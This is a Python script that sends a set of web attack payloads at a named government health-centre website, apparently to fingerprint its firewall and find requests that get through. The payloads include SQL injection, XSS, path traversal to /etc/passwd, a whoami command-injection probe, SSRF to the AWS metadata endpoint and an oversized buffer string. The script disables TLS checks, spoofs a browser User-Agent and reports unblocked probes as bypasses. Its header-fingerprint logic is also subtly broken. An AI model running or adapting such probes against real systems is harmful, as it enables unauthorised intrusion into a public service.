import requests
import sys
import time
import io
import socket
from urllib.parse import urlparse

# Force UTF-8 for Windows console
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

TARGET = "https://puskesjaten1.karanganyarkab.go.id"

PAYLOADS = {
    "SQLi (Union Select)": "/?id=-1 UNION SELECT 1,version(),3 --",
    "SQLi (Boolean)": "/?id=1 AND 1=1",
    "XSS (Script Tag)": "/?q=<script>alert(1)</script>",
    "XSS (SVG OnLoad)": "/?q=<svg/onload=alert(1)>",
    "LFI (Etc/Passwd)": "/?file=../../../../etc/passwd",
    "LFI (Win.ini)": "/?file=..\\..\\..\\windows\\win.ini",
    "RCE (Whoami)": "/?cmd=whoami",
    "Metadata (AWS)": "/?url=http://169.254.169.254/latest/meta-data/",
    "Large Payload (Buffer)": "/?id=" + "A" * 5000,
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

def check_connection_reset(url):
    """Check if server RSTs the connection (Hardware WAF/IPS behavior)"""
    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path + "?" + parsed.query if parsed.query else parsed.path
    
    try:
        # Create unverified context
        import ssl
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        sock = socket.create_connection((host, 443))
        ssock = context.wrap_socket(sock, server_hostname=host)
        
        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {HEADERS['User-Agent']}\r\nConnection: close\r\n\r\n"
        ssock.sendall(request.encode())
        
        response = b""
        while True:
            data = ssock.recv(4096)
            if not data:
                break
            response += data
            
        ssock.close()
        return False, response.decode('utf-8', errors='ignore')
        
    except (ConnectionResetError, socket.timeout):
        return True, None
    except Exception as e:
        return False, str(e)

def analyze_fingerprint(response_text, headers):
    sigs = []
    
    # Check Headers
    h_str = str(headers).lower()
    if "server" in headers:
        server = headers["server"].lower()
        if "nginx" in server: sigs.append("Server: Nginx")
        if "apache" in server: sigs.append("Server: Apache")
        if "cloudflare" in server: sigs.append("WAF: Cloudflare")
        if "akamai" in server: sigs.append("WAF: Akamai")
    
    if "set-cookie" in headers:
        cookies = headers["set-cookie"].lower()
        if "bigip" in cookies or "f5" in cookies: sigs.append("WAF: F5 BIG-IP")
        if "visid" in cookies or "incap" in cookies: sigs.append("WAF: Imperva/Incapsula")
        if "__cfduid" in cookies: sigs.append("WAF: Cloudflare")
        if "asl" in cookies: sigs.append("WAF: Atomicorp")
    
    if "x-iinfo" in h_str: sigs.append("WAF: Imperva")
    if "x-cdn" in h_str: sigs.append("CDN: Detected")
    
    # Check Body
    if response_text:
        body = response_text.lower()
        if "block" in body and "id" in body: sigs.append("Block Page: Generic")
        if "fortinet" in body or "fortigate" in body: sigs.append("WAF: Fortinet")
        if "palo alto" in body: sigs.append("WAF: Palo Alto")
        if "virus" in body: sigs.append("IPS: Antivirus Block")
    
    return sigs

def main():
    print(f"[+] Advanced WAF Fingerprinting: {TARGET}")
    print("========================================")
    
    print("[1] Testing Blocking Behavior (TCP Reset vs HTTP Block)...")
    
    for name, payload in PAYLOADS.items():
        full_url = TARGET + payload
        print(f"\n[*] Probe: {name}")
        
        # 1. Low Level Socket Check for RST
        is_rst, raw_response = check_connection_reset(full_url)
        
        if is_rst:
            print("    [!] CONNECTION RESET (RST) DETECTED!")
            print("    -> High Probability: Hardware WAF (Palo Alto, Fortinet, CheckPoint) or IPS")
        else:
            if raw_response and "HTTP" in raw_response:
                status_line = raw_response.split('\n')[0].strip()
                status_code = status_line.split(' ')[1] if len(status_line.split(' ')) > 1 else "?"
                print(f"    [+] HTTP Response: {status_line}")
                
                # Analyze content
                header_part = raw_response.split('\r\n\r\n')[0]
                sigs = analyze_fingerprint(raw_response, {"raw": header_part})
                if sigs:
                    print(f"    -> Fingerprints: {', '.join(sigs)}")
                    
                if status_code == "403":
                    print("    -> Blocked by Web Server/WAF (Layer 7)")
                elif status_code == "406":
                    print("    -> Blocked: Not Acceptable (ModSecurity Default?)")
                elif status_code == "500":
                     print("    -> Server Error (WAF confused or App crashed?)")
                elif status_code == "200":
                    print("    -> BYPASSED / ALLOWED")
            else:
                 print(f"    [?] Unknown connection state: {raw_response[:50]}...")

        time.sleep(1)

if __name__ == "__main__":
    main()
